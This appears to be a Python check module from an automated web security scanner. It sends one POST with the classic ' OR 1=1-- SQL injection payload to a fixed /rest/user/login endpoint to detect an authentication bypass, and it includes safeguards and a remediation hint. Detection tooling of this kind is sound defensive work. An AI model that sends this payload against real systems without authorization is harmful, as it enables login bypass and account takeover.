"""Prova de conceito REAL de bypass de autenticacao via SQL Injection (TA0006).

Cobre T1212 (Exploitation for Credential Access): uma falha de injecao no
fluxo de login permite obter um token de autenticacao sem credenciais
validas. Este e o UNICO check do catalogo que usa POST, e so para ESTE
endpoint fixo (``/rest/user/login``).

Decisao de escopo (ver ``app.engine.scope._EXTRA_METHOD_ALLOWLIST``): o
Scope Guard continua restrito a GET/OPTIONS para todos os demais checks e
rotas. A excecao de metodo e estreita, documentada no proprio Guard, e vale
somente para o par exato (POST, /rest/user/login) -- nao e uma liberacao
geral de metodos de escrita. A requisicao passa pelo MESMO Fetcher/Guard da
campanha (throttle, teto de requisicoes, auditoria), igual a qualquer outro
check.

O corpo da resposta (que contem o token JWT) NUNCA vai para a evidencia
bruta: ``build_evidence`` so grava status, headers sanitizados e o hash do
corpo. ``scrub_text`` tambem mascara qualquer JWT que escape para texto
livre (ver ``app.redact``), como defesa em profundidade.

O que este check NAO faz, mesmo apos confirmar o bypass:
- nao reutiliza o token para novas requisicoes (nao navega "como admin");
- nao tenta payloads destrutivos (sem DROP/UPDATE/DELETE);
- nao faz forca bruta de senha real;
- nao persiste o token em lugar algum.
"""

from __future__ import annotations

import json

from app.engine.checks.base import CheckContext, CheckOutcome
from app.models import Confidence, Profile, Severity, Status

LOGIN_PATH = "/rest/user/login"

# Payload classico de bypass de autenticacao via SQL Injection no campo de
# email. Comentario SQL encerra a clausula de senha; nao altera dados.
_SQLI_PAYLOAD = {"email": "' OR 1=1--", "password": "qualquer"}


async def sqli_login_bypass(ctx: CheckContext) -> CheckOutcome:
    """POST unico em /rest/user/login com payload classico de bypass."""
    # ctx.get nao aceita corpo JSON; chamamos o Fetcher diretamente (mesmo
    # guard/throttle/auditoria), passando json_body so para este POST fixo.
    result = await ctx.fetcher.request(
        "POST",
        ctx.origin + LOGIN_PATH,
        profile=Profile.ACTIVE_LIGHT,
        ev_id=ctx.next_ev_id(),
        headers={"Content-Type": "application/json"},
        note="Payload de bypass de autenticacao via SQL Injection no campo email.",
        json_body=_SQLI_PAYLOAD,
    )

    if not result.ok:
        return CheckOutcome(
            Status.INCONCLUSIVE,
            f"Nao foi possivel completar a requisicao de login ({result.error}).",
            confidence=Confidence.LOW,
        )

    evidence = [result.evidence] if result.evidence else []
    resp = result.response
    if resp.status_code != 200:
        return CheckOutcome(
            Status.PASS,
            "O endpoint de login rejeitou o payload de bypass por SQL Injection.",
            evidence=evidence,
        )

    try:
        payload = json.loads(resp.text[:5000])
    except ValueError:
        return CheckOutcome(
            Status.INCONCLUSIVE,
            "A resposta do login nao pode ser interpretada como JSON.",
            confidence=Confidence.LOW,
            evidence=evidence,
        )

    token = (payload.get("authentication") or {}).get("token") if isinstance(payload, dict) else None
    if token:
        return CheckOutcome(
            Status.FAIL,
            "O endpoint de login retornou um token de autenticacao valido para um payload de "
            "SQL Injection, sem exigir credenciais reais: bypass de autenticacao confirmado.",
            "Usar consultas parametrizadas (prepared statements) no fluxo de login; nunca concatenar "
            "entrada do usuario na clausula SQL de autenticacao.",
            severity=Severity.HIGH,
            evidence=evidence,
        )
    return CheckOutcome(
        Status.PASS,
        "O endpoint de login respondeu 200, mas sem emitir um token de autenticacao para o payload testado.",
        confidence=Confidence.MEDIUM,
        evidence=evidence,
    )
